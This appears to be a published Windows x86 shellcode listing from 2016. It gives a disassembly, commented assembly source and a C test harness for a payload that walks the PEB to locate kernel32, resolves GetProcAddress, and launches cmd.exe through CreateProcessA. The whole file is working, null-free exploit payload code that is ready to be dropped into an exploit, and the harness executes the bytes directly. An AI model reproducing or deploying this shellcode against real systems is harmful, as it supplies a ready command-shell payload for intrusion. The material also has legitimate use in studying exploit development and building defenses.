/*
	# Title : Windows x86 CreateProcessA(NULL,"cmd.exe",NULL,NULL,0,NULL,NULL,NULL,&STARTUPINFO,&PROCESS_INFORMATION) shellcode
	# Author : Roziul Hasan Khan Shifat
	# Date : 15-08-2016
	# Tested On : Windows 7 x86
*/


/*
Disassembly of section .text:

00000000 <_start>:
   0:	31 c9                	xor    %ecx,%ecx
   2:	64 8b 41 30          	mov    %fs:0x30(%ecx),%eax
   6:	8b 40 0c             	mov    0xc(%eax),%eax
   9:	8b 70 14             	mov    0x14(%eax),%esi
   c:	ad                   	lods   %ds:(%esi),%eax
   d:	96                   	xchg   %eax,%esi
   e:	ad                   	lods   %ds:(%esi),%eax
   f:	8b 48 10             	mov    0x10(%eax),%ecx
  12:	31 db                	xor    %ebx,%ebx
  14:	8b 59 3c             	mov    0x3c(%ecx),%ebx
  17:	01 cb                	add    %ecx,%ebx
  19:	8b 5b 78             	mov    0x78(%ebx),%ebx
  1c:	01 cb                	add    %ecx,%ebx
  1e:	8b 73 20             	mov    0x20(%ebx),%esi
  21:	01 ce                	add    %ecx,%esi
  23:	31 d2                	xor    %edx,%edx

00000025 <func>:
  25:	42                   	inc    %edx
  26:	ad                   	lods   %ds:(%esi),%eax
  27:	01 c8                	add    %ecx,%eax
  29:	81 38 47 65 74 50    	cmpl   $0x50746547,(%eax)
  2f:	75 f4                	jne    25 <func>
  31:	81 78 04 72 6f 63 41 	cmpl   $0x41636f72,0x4(%eax)
  38:	75 eb                	jne    25 <func>
  3a:	81 78 08 64 64 72 65 	cmpl   $0x65726464,0x8(%eax)
  41:	75 e2                	jne    25 <func>
  43:	8b 73 1c             	mov    0x1c(%ebx),%esi
  46:	01 ce                	add    %ecx,%esi
  48:	8b 14 96             	mov    (%esi,%edx,4),%edx
  4b:	01 ca                	add    %ecx,%edx
  4d:	89 d6                	mov    %edx,%esi
  4f:	89 cf                	mov    %ecx,%edi
  51:	31 db                	xor    %ebx,%ebx
  53:	68 79 41 41 41       	push   $0x41414179
  58:	66 89 5c 24 01       	mov    %bx,0x1(%esp)
  5d:	68 65 6d 6f 72       	push   $0x726f6d65
  62:	68 65 72 6f 4d       	push   $0x4d6f7265
  67:	68 52 74 6c 5a       	push   $0x5a6c7452
  6c:	54                   	push   %esp
  6d:	51                   	push   %ecx
  6e:	ff d2                	call   *%edx
  70:	83 c4 10             	add    $0x10,%esp
  73:	31 c9                	xor    %ecx,%ecx
  75:	89 ca                	mov    %ecx,%edx
  77:	b2 54                	mov    $0x54,%dl
  79:	51                   	push   %ecx
  7a:	83 ec 54             	sub    $0x54,%esp
  7d:	8d 0c 24             	lea    (%esp),%ecx
  80:	51                   	push   %ecx
  81:	52                   	push   %edx
  82:	51                   	push   %ecx
  83:	ff d0                	call   *%eax
  85:	59                   	pop    %ecx
  86:	31 d2                	xor    %edx,%edx
  88:	68 73 41 42 42       	push   $0x42424173
  8d:	66 89 54 24 02       	mov    %dx,0x2(%esp)
  92:	68 6f 63 65 73       	push   $0x7365636f
  97:	68 74 65 50 72       	push   $0x72506574
  9c:	68 43 72 65 61       	push   $0x61657243
  a1:	8d 14 24             	lea    (%esp),%edx
  a4:	51                   	push   %ecx
  a5:	52                   	push   %edx
  a6:	57                   	push   %edi
  a7:	ff d6                	call   *%esi
  a9:	59                   	pop    %ecx
  aa:	83 c4 10             	add    $0x10,%esp
  ad:	31 db                	xor    %ebx,%ebx
  af:	68 65 78 65 41       	push   $0x41657865
  b4:	88 5c 24 03          	mov    %bl,0x3(%esp)
  b8:	68 63 6d 64 2e       	push   $0x2e646d63
  bd:	8d 1c 24             	lea    (%esp),%ebx
  c0:	31 d2                	xor    %edx,%edx
  c2:	b2 44                	mov    $0x44,%dl
  c4:	89 11                	mov    %edx,(%ecx)
  c6:	8d 51 44             	lea    0x44(%ecx),%edx
  c9:	56                   	push   %esi
  ca:	31 f6                	xor    %esi,%esi
  cc:	52                   	push   %edx
  cd:	51                   	push   %ecx
  ce:	56                   	push   %esi
  cf:	56                   	push   %esi
  d0:	56                   	push   %esi
  d1:	56                   	push   %esi
  d2:	56                   	push   %esi
  d3:	56                   	push   %esi
  d4:	53                   	push   %ebx
  d5:	56                   	push   %esi
  d6:	ff d0                	call   *%eax
  d8:	5e                   	pop    %esi
  d9:	83 c4 08             	add    $0x8,%esp
  dc:	31 db                	xor    %ebx,%ebx
  de:	68 65 73 73 41       	push   $0x41737365
  e3:	88 5c 24 03          	mov    %bl,0x3(%esp)
  e7:	68 50 72 6f 63       	push   $0x636f7250
  ec:	68 45 78 69 74       	push   $0x74697845
  f1:	8d 1c 24             	lea    (%esp),%ebx
  f4:	53                   	push   %ebx
  f5:	57                   	push   %edi
  f6:	ff d6                	call   *%esi
  f8:	31 c9                	xor    %ecx,%ecx
  fa:	51                   	push   %ecx
  fb:	ff d0                	call   *%eax
*/


/*
section .text
	global _start
_start:


xor ecx,ecx
mov eax,[fs:ecx+0x30] ;PEB
mov eax,[eax+0xc] ;PEB->ldr
mov esi,[eax+0x14] ;PEB->ldr.InMemOrderModuleList
lodsd
xchg esi,eax
lodsd
mov ecx,[eax+0x10] ;kernel32 base address


xor ebx,ebx
mov ebx,[ecx+0x3c] ;DOS->elf_anew
add ebx,ecx ;PE HEADER
mov ebx,[ebx+0x78] ;DataDirectory->VirtualAddress
add ebx,ecx ;IMAGE_EXPORT_DIRECTORY

mov esi,[ebx+0x20] ;AddressOfNames
add esi,ecx


;---------------------------------------------

xor edx,edx

func:
inc edx
lodsd
add eax,ecx
cmp dword [eax],'GetP'
jnz func
cmp dword [eax+4],'rocA'
jnz func
cmp dword [eax+8],'ddre'
jnz func


;--------------------------------


mov esi,[ebx+0x1c] ;AddressOfFunctions
add esi,ecx

mov edx,[esi+edx*4]
add edx,ecx ;GetProcAddress()

;-------------------------------------

mov esi,edx
mov edi,ecx

;-------------------------


xor ebx,ebx


;finding address of RtlZeroMemory()

push 0x41414179
mov [esp+1],word bx
push 0x726f6d65
push 0x4d6f7265
push 0x5a6c7452



push esp
push ecx

call edx

;------------------------------
add esp,16
;-----------------------------------


;zero out 84 bytes


xor ecx,ecx
mov edx,ecx

mov dl,84

push ecx

sub esp,84

lea ecx,[esp]

push ecx

push edx
push ecx

call eax


;----------------------------

;finding address of CreateProcessA()
pop ecx

xor edx,edx

push 0x42424173
mov [esp+2],word dx
push 0x7365636f
push 0x72506574
push 0x61657243

lea edx,[esp]

push ecx

push edx
push edi

call esi


;--------------------------------
;CreateProcessA(NULL,"cmd.exe",NULL,NULL,0,NULL,NULL,NULL,&STARTUPINFO,&PROCESS_INFORMATION)

pop ecx

add esp,16

xor ebx,ebx
push 0x41657865
mov [esp+3],byte bl
push 0x2e646d63

lea ebx,[esp]


xor edx,edx
mov dl,68

mov [ecx],edx

lea edx,[ecx+68]


push esi ;

xor esi,esi


push edx
push ecx

push esi
push esi
push esi
push esi
push esi
push esi

push ebx
push esi

call eax

pop esi

;-------------------------------------
;finding address of ExitProcess()

add esp,8

xor ebx,ebx

push 0x41737365
mov [esp+3],byte bl
push 0x636f7250
push 0x74697845


lea ebx,[esp]


push ebx
push edi

call esi

xor ecx,ecx
push ecx
call eax
*/


#include<stdio.h>
#include<string.h>
char shellcode[]=\

"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x48\x10\x31\xdb\x8b\x59\x3c\x01\xcb\x8b\x5b\x78\x01\xcb\x8b\x73\x20\x01\xce\x31\xd2\x42\xad\x01\xc8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xce\x8b\x14\x96\x01\xca\x89\xd6\x89\xcf\x31\xdb\x68\x79\x41\x41\x41\x66\x89\x5c\x24\x01\x68\x65\x6d\x6f\x72\x68\x65\x72\x6f\x4d\x68\x52\x74\x6c\x5a\x54\x51\xff\xd2\x83\xc4\x10\x31\xc9\x89\xca\xb2\x54\x51\x83\xec\x54\x8d\x0c\x24\x51\x52\x51\xff\xd0\x59\x31\xd2\x68\x73\x41\x42\x42\x66\x89\x54\x24\x02\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x8d\x14\x24\x51\x52\x57\xff\xd6\x59\x83\xc4\x10\x31\xdb\x68\x65\x78\x65\x41\x88\x5c\x24\x03\x68\x63\x6d\x64\x2e\x8d\x1c\x24\x31\xd2\xb2\x44\x89\x11\x8d\x51\x44\x56\x31\xf6\x52\x51\x56\x56\x56\x56\x56\x56\x53\x56\xff\xd0\x5e\x83\xc4\x08\x31\xdb\x68\x65\x73\x73\x41\x88\x5c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x8d\x1c\x24\x53\x57\xff\xd6\x31\xc9\x51\xff\xd0";

main()
{
printf("shellcode lenght %ld\n",(long)strlen(shellcode));
(* (int(*)()) shellcode) ();
}